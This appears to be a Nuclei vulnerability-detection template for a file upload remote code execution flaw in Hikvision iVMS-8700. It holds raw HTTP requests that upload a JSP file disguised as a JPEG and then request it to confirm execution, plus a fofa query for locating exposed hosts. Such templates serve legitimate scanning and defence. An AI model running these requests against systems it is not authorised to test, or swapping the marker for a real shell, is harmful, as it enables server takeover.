http:
- extractors:
  - internal: true
    json:
    - .data.resourceUuid
    name: res_id
    type: json
  matchers:
  - dsl:
    - body_2 == str2
    type: dsl
  raw:
  - 'POST /eps/resourceOperations/upload.action HTTP/1.1

    Host: {{Hostname}}

    User-Agent: MicroMessenger

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj


    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj

    Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"

    Content-Type: image/jpeg


    {{str3}}

    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--

    '
  - 'GET /eps/upload/{{res_id}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: hikvision-ivms-file-upload-rce
info:
  author: brucelsone
  description: 'Arbitrary file upload vulnerability in HIKVISION iVMS-8700 Integrated
    Security Management Platform Software allows attackers to upload and execute malicious
    files, leading to potential unauthorized server control.

    '
  metadata:
    fofa-query: icon_hash="-911494769"
    max-request: 2
  name: Hikvision iVMS-8700 - File Upload Remote Code Execution
  reference:
  - https://www.wangan.com/p/11v754aceadb994f
  - https://cn-sec.com/archives/1828326.html
  severity: critical
  tags: hikvision,ivms,fileupload,rce,intrusive
variables:
  str1: '{{rand_base(6)}}'
  str2: '{{rand_base(6)}}'
  str3: <%out.print("{{str2}}");%>
